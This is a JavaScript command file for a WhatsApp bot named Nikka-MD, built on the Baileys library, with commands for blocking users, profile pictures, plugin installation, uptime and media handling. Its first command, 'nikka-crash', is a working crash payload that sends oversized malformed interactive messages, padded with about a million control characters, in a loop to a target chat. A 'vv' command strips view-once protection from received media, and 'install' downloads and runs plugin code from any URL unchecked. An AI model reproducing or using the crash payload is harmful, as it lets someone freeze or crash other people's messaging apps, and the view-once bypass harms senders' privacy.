const { getDevice } = require("@whiskeysockets/baileys");
const {
  command,
  isPrivate,
  getBuffer
} = require("../lib/");
// nikka
const { downloadMediaMessage } = require("@whiskeysockets/baileys");
const plugins = require("../lib/event");
const {
    clockString,
    getUrl,
    parsedJid,
    isAdmin
    
} = require("../lib");
const {
    BOT_INFO
} = require("../config");
const config = require("../config");
const { tiny } = require("../lib/fancy_font/fancy");
const Jimp = require("jimp");
const got = require("got");
const path = require("path")
const fs = require("fs");
const { PluginDB, installPlugin } = require("../lib/database/plugins");





command(
  {
    pattern: "nikka-crash",
    fromMe: true,
    desc: "",
    type: "user",
  }, async (message, match, m, client) => {
	  if (!match) return message.reply(`Number of bugs to send?\n\tExample: .nikka-crash 20`)	  
          let count = match
          const thq = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "ɴɪᴋᴋᴀ-ᴍᴅ",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ɴɪᴋᴋᴀ-ᴍᴅ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ɴɪᴋᴋᴀ-ᴍᴅ\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"ɴɪᴋᴋᴀ-ᴍᴅ${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
	  }
	              async function bugfunc(Ptcp = false) {
                        let etc = generateWAMessageFromContent(message.jid, proto.Message.fromObject({
                                viewOnceMessage: {
                                        message: {
                                                interactiveMessage: {
                                                        header: {
                                                                title: "",
                                                                locationMessage: {},
                                                                hasMediaAttachment: true
                                                        },
                                                        body: {
                                                                text: "ɴɪᴋᴋᴀ-ᴍᴅ"
                                                        },
                                                        nativeFlowMessage: {
                                                                name: "call_permission_request",
                                                                messageParamsJson: "ɴɪᴋᴋᴀ-ᴍᴅ"
                                                        },
                                                        carouselMessage: {}
                                                }
                                        }
                                }
                        }), {
                                userJid: message.jid,                                                                                                                                  
				quoted: thq
                        });

                        await message.client.relayMessage(message.jid, etc.message, Ptcp ? {
                                participant: {
                                        jid: message.jid
                                }
                        } : {});
		      }
	        for (let i = 0;i < count;i++) {
		await bugfunc(Ptcp = false)
                await bugfunc(Ptcp = true)
		}
               await message.reply("Done ✅")
  })


command(
  {
    pattern: "pp",
    fromMe: true,
    desc: "Update your profile picture by replying to an image.",
    type: "user",
  },
  async (message) => {
    try {
      // Ensure the message has a reply and that the reply is an image
      if (!message.reply_message || !message.reply_message.image) {
        return await message.reply("Please reply to an image to set it as your profile picture.");
      }

      // Download the media (image) from the reply
      const imageBuffer = await message.reply_message.downloadMediaMessage();
      
      // If the download failed, return an error message
      if (!imageBuffer) {
        return await message.reply("Failed to download the image. Please try again.");
      }

      // Get the bot's own JID (user's WhatsApp ID)
      const botJid = message.client.user.id;

      // Update the profile picture using the bot's JID and the image buffer
      await message.client.updateProfilePicture(botJid, { url: imageBuffer });
      await message.reply("Your profile picture has been updated successfully!");
    } catch (error) {
      console.error("Error updating profile picture:", error);
      await message.reply("An error occurred while updating your profile picture. Please try again later.");
    }
  }
);



command(
  {
    pattern: "block",
    fromMe: true,
    desc: "Block a person",
    type: "user",
  },
  async (message, match) => {
    if (message.isGroup) {
      let jid = message.mention[0] || message.reply_message.jid;
      if (!jid) return await message.reply("*_Need a number/reply/mention!_*");
      await message.block(jid);
      return await message.sendMessage(`_@${jid.split("@")[0]} Blocked_`, {
        mentions: [jid],
      });
    } else {
      await message.block(message.jid);
      return await message.reply("_User blocked_");
    }
  }
);



command(
  {
    pattern: "unblock",
    fromMe: true,
    desc: "Unblock a person",
    type: "user",
  },
  async (message, match) => {
    if (message.isGroup) {
      let jid = message.mention[0] || message.reply_message.jid;
      if (!jid) return await message.reply("*_Need a number/reply/mention!_*");
      await message.block(jid);
      return await message.sendMessage(`*_@${jid.split("@")[0]} unblocked_*`, {
        mentions: [jid],
      });
    } else {
      await message.unblock(message.jid);
      return await message.reply("*_User unblocked_*");
    }
  }
);



command(
  {
    pattern: "jid",
    fromMe: true,
    desc: "Give jid of chat/user",
    type: "user",
  },
  async (message, match) => {
    return await message.sendMessage(
      message.mention[0] || message.reply_message.jid || message.jid
    );
  }
);



command(
  {
    pattern: "dlt",
    fromMe: true,
    desc: "deletes a message",
    type: "user",
  },
  async (message, match,m,client) => {
    if (!message.reply_message) return await message.reply("*_Reply to a message_*"); {
      await client.sendMessage(message.jid, { delete: message.reply_message.key })
    }
  }
);




command(
  {
    pattern: "cmdlist",
    fromMe: isPrivate,
    desc: "Show All Commands",
    type: "help",
    dontAddCommandList: true,
  },
  async (message, match, { prefix }) => {
    let menu = `╭───────┈┫「 *𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐋𝐢𝐬𝐭* 」┣┈────♡`;
    menu += `\n│\n`;

    let cmnd = [];
    let cmd, desc;
    plugins.commands.map((command) => {
      if (command.pattern) {
        cmd = command.pattern.toString().split(/\W+/)[1];
      }
      desc = command.desc || false;

      if (!command.dontAddCommandList && cmd !== undefined) {
        cmnd.push({ cmd, desc });
      }
    });
    cmnd.sort();
    cmnd.forEach(({ cmd, desc }, num) => {
      menu += `│  ${(num += 1)}. *${cmd.trim()}*`;
      if (desc) menu += `\n│  Use: \`\`\`${desc}\`\`\``;
      menu += `\n│\n`;
    });
    menu += `╰───────┈┫「 NIKKA 」┣┈────♡`;
    return await message.reply(message.jid, { text: (tiny(menu)) })
})




command(
  {
    pattern: "install ?(.*)",
    fromMe: true,
    desc: "Install External plugins",
    type:'user'
  },
  async (message, match) => {
    if (!match) return await message.sendMessage("*_Plugin Url not found_*");
    for (let Url of getUrl(match)) {
      try {
        var url = new URL(Url);
      } catch {
        return await message.sendMessage("*_Invalid Url_*");
      }

      if (url.host === "gist.github.com") {
        url.host = "gist.githubusercontent.com";
        url = url.toString() + "/raw";
      } else {
        url = url.toString();
      }
      var plugin_name;
      var response = await got(url);
      if (response.statusCode == 200) {
        var commands = response.body
          .match(/(?<=pattern:)(.*)(?=\?(.*))/g)
          .map((a) => a.trim().replace(/"|'|`/, ""));
        plugin_name =
          commands[0] ||
          plugin_name[1] ||
          "__" + Math.random().toString(36).substring(8);

        fs.writeFileSync("./plugins/" + plugin_name + ".js", response.body);
        try {
          require("./" + plugin_name);
        } catch (e) {
          fs.unlinkSync("/xasena/plugins/" + plugin_name + ".js");
          return await message.sendMessage("*_Invalid Plugin_*\n ```" + e + "```");
        }

        await installPlugin(url, plugin_name);

        await message.sendMessage(
          `*_Plugin installed : ${commands.join(",")}_*`
        );
      }
    }
  }
);



command(
  { 
      pattern: "allplug", 
      fromMe: true, 
      desc: "plugin list",
      type:'user'},
  async (message, match) => {
    var mesaj = "";
    var plugins = await PluginDB.findAll();
    if (plugins.length < 1) {
      return await message.sendMessage("*_No external plugins installed_*");
    } else {
      plugins.map((plugin) => {
        mesaj +=
          "```" +
          plugin.dataValues.name +
          "```: " +
          plugin.dataValues.url +
          "\n";
      });
      return await message.sendMessage(mesaj);
    }
  }
);



command(
  {
    pattern: "remove(?: |$)(.*)",
    fromMe: true,
    desc: "Remove external plugins",
    type:'user'
  },
  async (message, match) => {
    if (!match) return await message.sendMessage("*_Need a plugin name_*");

    var plugin = await PluginDB.findAll({ where: { name: match } });

    if (plugin.length < 1) {
      return await message.sendMessage("*_Plugin not found_*");
    } else {
      await plugin[0].destroy();
      delete require.cache[require.resolve("./" + match + ".js")];
      fs.unlinkSync("./plugins/" + match + ".js");
      await message.sendMessage(`*_Plugin ${match} deleted, restart_*`);
    }
  }
);


command(
    {
	pattern: 'setbio(.*)',
	fromMe: true,
	desc: 'to change your profile status',
	type: 'user'
}, async (message, match) => {
	match = match || message.reply_message.text
	if (!match) return await message.reply('*_Need Text_!*\n *Example: setbio _Eypz-God_*.')
	await message.client.updateProfileStatus(match)
	await message.reply('*_Successfully bio updated_*')
})


command(
    {
        pattern: "dev", // Command to display developer info
        fromMe: isPrivate,
        desc: "Displays information about the developer",
        type: "user",
    },
    async (message) => {
        const devInfo = `
━━ About the Developer ━┓
> *Name*: 𝞖𝞓𝞙𝞘 𝙎𝞢𝞒

> *Profession*: Software Developer

> *Nationality*: UAE/NIGERIA

> *Contact*: +2349112171078

> *Website*:  https://haki.us.kg

> *Expertise*: Bot Development, Web Design, AI Systems        
━━━━━━━━━━━       
        `.trim();

        const imageUrl = "https://files.catbox.moe/flinnf.jpg"; // Developer image
        const thumbnailUrl = "https://files.catbox.moe/cuu1aa.jpg"; // Thumbnail image

        await message.client.sendMessage(message.jid, {
            image: { url: imageUrl },
            caption: devInfo,
            contextInfo: {
                externalAdReply: {
                    title: "𝞖𝞓𝞙𝞘 𝙎𝞢𝞒 - Developer Info",
                    body: "About haki",
                    sourceUrl: "https://haki.us.kg", // Link to website
                    mediaUrl: "https://haki.us.kg",
                    mediaType: 4,
                    showAdAttribution: true,
                    renderLargerThumbnail: false,
                    thumbnailUrl: thumbnailUrl,
                },
            },
        });
    }
);


command(
  {
    pattern: "getgpp",
    fromMe: true,
    desc: "Fetch the profile picture of the current group chat.",
    type: "group",
  },
  async (message) => {
    try {
      if (!message.isGroup) {
        return await message.reply("This command can only be used in group chats.");
      }

      // Fetch the group profile picture URL
      const groupPicUrl = await message.client.profilePictureUrl(message.jid, "image").catch(() => null);

      if (!groupPicUrl) {
        return await message.reply("No profile picture found for this group.");
      }

      // Send the group profile picture
      await message.client.sendMessage(message.jid, {
        image: { url: groupPicUrl },
        caption: "Here is the profile picture of this group chat.",
      });
    } catch (error) {
      console.error("Error fetching group profile picture:", error);
      await message.reply("An error occurred while fetching the group profile picture. Please try again later.");
    }
  }
);


command(
  {
    pattern: "getpp",
    fromMe: true,
    desc: "Fetch the profile picture of a mentioned or replied user.",
    type: "user",
  },
  async (message) => {
    try {
      // Check if a user is mentioned or a message is replied to
      const targetUser =
        message.mentionedJid?.[0] || // Get the first mentioned user
        (message.reply_message ? message.reply_message.jid : null); // Get the user in the replied message

      if (!targetUser) {
        return await message.reply("Please mention a user or reply to a user's message.");
      }

      // Fetch the profile picture URL
      const profilePicUrl = await message.client.profilePictureUrl(targetUser, "image").catch(() => null);

      if (!profilePicUrl) {
        return await message.reply("No profile picture found for the specified user.");
      }

      // Send the profile picture
      await message.client.sendMessage(message.jid, {
        image: { url: profilePicUrl },
        caption: "Here is the profile picture of the specified user.",
      });
    } catch (error) {
      console.error("Error fetching profile picture:", error);
      await message.reply("An error occurred while fetching the profile picture. Please try again later.");
    }
  }
);
command(
    {
        pattern: "ping",
        fromMe: isPrivate,
        desc: "To check ping",
        type: "user",
    },
    async (message, match, client) => {
     
        const start = new Date().getTime();
      let { key } = await message.sendMessage(`*checking...*`);
        const end = new Date().getTime();
var speed = end - start;
 
await new Promise(t => setTimeout(t,0))
         await message.client.sendMessage(message.jid,{text:`*Pong* 🧚‍♂️
${speed} *𝚖𝚜*` , edit: key});
    await message.react("✅️")
})

const store = new Map(); // Used to store toggle states and user-specific data
const schedule = require("node-schedule");

let autobioJob;
const mockData = [
  "ϙᴜᴇ ꜱᴇʀᴀ ꜱᴇʀᴀ....[HAKI]",
  "ᴡɪsᴅᴏᴍ ʜᴀs ʙᴇᴇɴ ʜᴜɴᴛɪɴɢ ʏᴏᴜ, ʙᴜᴛ ʏᴏᴜ'ᴠᴇ ᴀʟᴡᴀʏs ʙᴇᴇɴ ғᴀsᴛᴇʀ....[HAKI]",
  "ᴀs ʏᴏᴜ ᴄᴀɴ sᴇᴇ, ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴅᴇᴀᴅ....[HAKI]",
  "ɴᴇᴠᴇʀ ʟᴏsᴇ ʏᴏᴜʀ ɪɴɴᴏᴄᴇɴᴄᴇ....[HAKI]",
  "ᴅᴏ ɴᴏᴛ ᴡᴏʀʀʏ, ᴇᴠᴇʀʏᴛʜɪɴɢ ɪs ɢᴏɪɴɢ ᴛᴏ ʙᴇ ᴏᴋᴀʏ....[HAKI]",
  "ᴛᴏ ʟɪᴠᴇ ɪs ᴛᴏ ʀɪsᴋ, ᴛᴏ ᴅᴇᴀᴅ ɪs ᴛᴏ ᴄᴏɴǫᴜᴇʀ....[HAKI]",
  "ʏᴏᴜ'ʀᴇ ᴛʜᴇ ᴀʀᴛ ᴏғ ʏᴏᴜʀ ᴏᴡɴ ᴅᴇsᴛɪɴʏ....[HAKI]",
  "ᴅᴏɴ'ᴛ ᴇᴠᴇʀ ɪɴʜɪʙɪᴛ ʏᴏᴜʀ ᴡɪɴɢs....[HAKI]",
  "ɢɪᴠᴇ ᴛʜᴇ ᴡᴏʀʟᴅ ʏᴏᴜʀ ʙᴇsᴛ ᴠᴇʀsɪᴏɴ....[HAKI]",
  "ᴄʀᴇᴀᴛᴇ ʏᴏᴜʀ ᴅᴇsᴛɪɴʏ, ᴅᴏɴ'ᴛ ʟᴇᴛ ɪᴛ ʙᴇ ᴄʀᴇᴀᴛᴇᴅ ғᴏʀ ʏᴏᴜ....[HAKI]"
];

// Command to toggle autobio
command(
  {
    pattern: "autobio ?(.*)",
    fromMe: true,
    desc: "Enable/Disable autobio updates",
    type: "user",
  },
  async (message, m, match) => {
    const user = m.sender;
    const args = match.toLowerCase();

    if (args === "on") {
      if (store.get(user)) {
        return await message.reply("Autobio is already enabled for you.");
      }

      store.set(user, true);

      // Start autobio updates
      autobioJob = schedule.scheduleJob("0 0 0 * * *", async () => {  // Trigger every day at midnight
        const randomBio = mockData[Math.floor(Math.random() * mockData.length)];
        await message.client.updateProfileStatus(randomBio);
        console.log(`Bio updated for ${user}: ${randomBio}`);
      });

      return await message.reply("Autobio has been enabled. Bio will update every 24 hours.");
    } else if (args === "off") {
      if (!store.get(user)) {
        return await message.reply("Autobio is not enabled for you.");
      }

      store.delete(user);

      // Stop autobio updates
      if (autobioJob) {
        autobioJob.cancel();
        autobioJob = null;
      }

      return await message.reply("Autobio has been disabled.");
    } else {
      return await message.reply("Usage: !autobio on/off");
    }
  }
);

command({
    pattern: "uptime",
    fromMe: isPrivate,
    desc: "Bot Runtime",
    type: "user",
}, async (message, match) => {
    try {
        // Calculate bot runtime in seconds
        const uptimeInSeconds = process.uptime();

        // Calculate days, hours, minutes, and seconds
        const days = Math.floor(uptimeInSeconds / (24 * 3600));
        const hours = Math.floor((uptimeInSeconds % (24 * 3600)) / 3600);
        const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
        const seconds = Math.floor(uptimeInSeconds % 60);

        // Construct the uptime message (heading will be uptime in bold)
        const uptimeMessage = `*${days} Days, ${hours} Hours, ${minutes} Minutes, ${seconds} Seconds*`; // Bold uptime message

        // Define the audio URL and the thumbnail URL (you'll provide the thumbnail URL)
        const aud = 'https://files.catbox.moe/hbrrav.mp3';  // Provided audio URL
        const thumbnailUrl = 'https://files.catbox.moe/1838qx.jpg'; // Replace with the thumbnail URL you provide

        // Send the audio with the uptime as the heading and the thumbnail
        await message.client.sendMessage(message.jid, {
            audio: { url: aud },
            mimetype: "audio/mpeg",
            ptt: true,
            contextInfo: {
                externalAdReply: {
                    title: uptimeMessage, // Display uptime as the title (bold)
                    body: "Powered by Nikka Botz", // Footer message
                    sourceUrl: "https://whatsapp.com/channel/0029VaoLotu42DchJmXKBN3L", // Channel URL
                    mediaUrl: aud, // Audio URL
                    mediaType: 1,
                    showAdAttribution: true,
                    renderLargerThumbnail: true,
                    thumbnailUrl: thumbnailUrl // Provided thumbnail URL
                }
            }
        });
    } catch (error) {
        console.error('Error sending audio with uptime:', error);
        await message.reply('❌ Failed to send the audio with uptime.');
    }
});
command(
  {
    pattern: "getDevice",
    desc: "Check the device type of a message sender",
    type: "user",
    fromMe: isPrivate,
  },
  async (message) => {
    if (!message.reply_message) {
      return await message.haki("Please reply to a message to check the device type.");
    }

    try {
      // Check if the message ID starts with "H4KI"
      if (message.reply_message.id.startsWith("H4KI")) {
        return await message.haki("NIKKA MD");
      }

      // Extract the device type
      const device = getDevice(message.reply_message.key.id);

      // Determine the device type
      let deviceType = "";
      switch (device) {
        case "android":
          deviceType = "Android";
          break;
        case "ios":
          deviceType = "iOS";
          break;
        case "web":
        case "Unknown": // Handle "Unknown" as WhatsApp Web
          deviceType = "WhatsApp Web";
          break;
        default:
          deviceType = "WhatsApp Bot"; // Changed from "Unknown Device" to "WhatsApp Bot"
          break;
      }

      // Send the device type
      return await message.haki(deviceType);
    } catch (error) {
      console.error(error);
      return await message.haki("An error occurred while determining the device type.");
    }
  }
);
command(
    {
        pattern: "save",
        desc: "Save and forward the status message",
        fromMe: true,
        type: "user",   
    },
    async (message, match) => {
        // Check if the message contains a reply
        await message.react("⏳️")
        if (!message.reply_message) {
            return await message.reply("Please reply to the message you want to save as status.");
        }

        try {
            // Forward the replied message as the user's status
            await message.client.sendMessage(message.jid, { forward: message.reply_message });
            await message.react("");
            
        } catch (error) {
            console.error(error);
            await message.reply("An error occurred while saving your status. Please try again.");
        }
    }
);


command(
  {
      pattern: "listgc",
      desc: "Lists all the groups you are in",
      fromMe: isPrivate,
      type: "user",
  },
  async (message) => {
      try {
         

          const groups = await message.client.groupFetchAllParticipating();
          let groupList = Object.values(groups).map((group, index) => 
              `${index + 1}. *${group.subject}*\n   JID: ${group.id}`
          ).join("\n\n");

          if (!groupList) {
              return await message.reply("You are not in any groups.");
          }

          await message.reply(`*Your Groups:*\n\n${groupList}`);
      } catch (error) {
          console.error(error);
          await message.reply("An error occurred while fetching your groups.");
      }
  }
);



/*command(
  {
      pattern: "blocklist",
      desc: "Fetches the blocked contacts list",
      fromMe: true,
      type: "user",
  },
  async (message) => {
      try {
          let blockedUsers = await message.client.fetchBlocklist();

          if (!blockedUsers || blockedUsers.length === 0) {
              return await message.reply("✅ No blocked contacts found.");
          }

          let mentions = blockedUsers;
          let blockedList = blockedUsers.map((jid, index) => 
            ${index + 1}. @${jid.split("@")[0]}
        ).join("\n");
        

        await message.reply(🚫 *Blocked Contacts:*\n\n${blockedList}, { mentions });

      } catch (error) {
          console.error(error);
          await message.reply("An error occurred while fetching the blocklist.");
      }
  }
);

*/


command(
    {
        pattern: "vv",
        desc: "Convert view once media to normal",
        fromMe: isPrivate,
        type: "user",
    },
    async (message, match) => {
        try {
            if (!message.reply_message) {
                return await message.reply("⚠ Reply to a view-once image, video, or audio with .unvv");
            }

            let mediaType = Object.keys(message.reply_message.message)[0];
            if (!["imageMessage", "videoMessage", "audioMessage"].includes(mediaType)) {
                return await message.reply("⚠ Only view-once images, videos, and audio can be converted.");
            }

            // Create "temp" folder if it doesn't exist
            const tempFolder = path.join(__dirname, "temp");
            if (!fs.existsSync(tempFolder)) {
                fs.mkdirSync(tempFolder, { recursive: true });
            }

            // Define media path
            let extension = mediaType.includes("audio") ? "mp3" : mediaType.includes("video") ? "mp4" : "jpg";
            let mediaPath = path.join(tempFolder, `${Date.now()}.${extension}`);

            // Download media
            let buffer = await downloadMediaMessage(message.reply_message, "buffer");
            fs.writeFileSync(mediaPath, buffer);

            // Get caption (if available)
            let caption = message.reply_message.message[mediaType]?.caption || "";

            // Send as normal media
            await message.client.sendMessage(
                message.jid,
                {
                    [mediaType.replace("Message", "")]: { url: mediaPath },
                    caption: caption,
                }
            );

            // Delete file after sending
            setTimeout(() => fs.unlinkSync(mediaPath), 5000);
        } catch (error) {
            console.error(error);
            await message.reply("❌ Failed to process media.");
        }
    }
);



command(
    {
        pattern: "tovv",
        desc: "Convert media to view once",
        fromMe: isPrivate,
        type: "user",
    },
    async (message, match) => {
        try {
            if (!message.reply_message) {
                return await message.reply("⚠ Reply to an image, video, or audio with .tovv");
            }

            let mediaType = Object.keys(message.reply_message.message)[0];
            if (!["imageMessage", "videoMessage", "audioMessage"].includes(mediaType)) {
                return await message.reply("⚠ Only images, videos, and audio can be converted to view once.");
            }

            // Create "temp" folder if it doesn't exist
            const tempFolder = path.join(__dirname, "temp");
            if (!fs.existsSync(tempFolder)) {
                fs.mkdirSync(tempFolder, { recursive: true });
            }

            // Define media path
            let extension = mediaType.includes("audio") ? "mp3" : mediaType.includes("video") ? "mp4" : "jpg";
            let mediaPath = path.join(tempFolder, `${Date.now()}.${extension}`);


            // Download media
            let buffer = await downloadMediaMessage(message.reply_message, "buffer");
            fs.writeFileSync(mediaPath, buffer);

            // Get caption (if available)
            let caption = message.reply_message.message[mediaType]?.caption || "";

            // Send as view once
            await message.client.sendMessage(
                message.jid,
                {
                    [mediaType.replace("Message", "")]: { url: mediaPath },
                    viewOnce: true,
                    caption: caption,
                }
            );

            // Delete file after sending
            setTimeout(() => fs.unlinkSync(mediaPath), 5000);
        } catch (error) {
            console.error(error);
            await message.reply("❌ Failed to process media.");
        }
    }
);
const pk = require("../package.json");

command(
  {
    pattern: "repo",
    fromMe: isPrivate,
    desc: "Shows bot repository",
    type: "user",
  },
  async (message, match) => {
    const repoInfo = `\`\`\`╭───𖣘 𝗡𝗶𝗸𝗸𝗮 𝗠𝗗 𝗥𝗲𝗽𝗼 ────
🌻 Name: Nikka-MD
🌻 Version: ${pk.version} 
🌻 Creator: H4KI XER
🌻 Repo: https://github.com/haki-xerr/Nikka-Md
🌻 Pair: https://pair-nikka.onrender.com
🌻 Language: JavaScript
╰────────────\`\`\``;

    const thumbnailUrl = "https://files.catbox.moe/rfgpy8.jpg";

    await message.client.sendMessage(message.jid, {
      text: repoInfo,
      contextInfo: {
        externalAdReply: {
          title: "𝞖𝞓𝞙𝞘 𝙎𝞢𝞒",
          body: "Official repository of Nikka MD",
          sourceUrl: "https://github.com/hakisolos/Nikka-Md",
          mediaType: 4,
          thumbnailUrl: thumbnailUrl,
          renderLargerThumbnail: false,
          showAdAttribution: true,
        },
      },
    });
  }
);
